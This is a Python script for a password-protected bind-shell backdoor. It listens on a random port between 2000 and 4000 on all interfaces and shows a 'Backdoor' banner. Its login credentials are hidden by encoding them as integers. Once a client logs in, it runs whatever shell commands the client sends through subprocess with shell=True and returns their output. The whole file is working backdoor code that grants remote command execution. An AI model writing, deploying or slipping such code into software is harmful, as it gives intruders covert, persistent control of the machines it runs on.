#!/usr/bin/python3

import socket
from threading import Thread
import subprocess
import pyfiglet
from random import randint
from Crypto.Util.number import long_to_bytes
import os
from platform import node
from getpass import getuser

os.system('clear')

string = f'''┌──({getuser()}㉿{node()})-[{os.getcwd()}]
└─$ '''
host = '0.0.0.0'
port = randint(2000, 4000)
username = long_to_bytes(7561581).decode()
password = long_to_bytes(8388070250388875636).decode()

class ClientThread(Thread):
    def __init__(self, sock, username, password):
        Thread.__init__(self)
        self.sock = sock

    def run(self):
        self.sock.send(pyfiglet.figlet_format('Backdoor').encode())
        self.sock.send(b'Username: ')
        user = self.sock.recv(1024).decode()
        self.sock.send(b'Password: ')
        passwd = self.sock.recv(1024).decode()
        if user.strip('\n') == username and passwd.strip('\n') == password:
            while True:
                self.sock.send(string.encode())
                cmd = self.sock.recv(1024)
                stdcomm = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout = stdcomm.stdout.read()
                stderr = stdcomm.stderr.read()
                self.sock.send(stdout)
                self.sock.send(stderr)
        else:
            self.sock.send(b'********* Invalid Username Or Password *********\n\n')
            self.run()

if __name__ == '__main__':
    s = socket.socket()
    s.bind((host, port))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print("----------------------------------------------------------------")
    print(f"Server Started At : {host}:{port}")
    print("----------------------------------------------------------------")

    while True:
        s.listen(1)
        conn, addr = s.accept()
        print(f'[+] Connection From ({addr[0]}):({addr[1]})')
        client_thread = ClientThread(conn, username, password)
        client_thread.start()
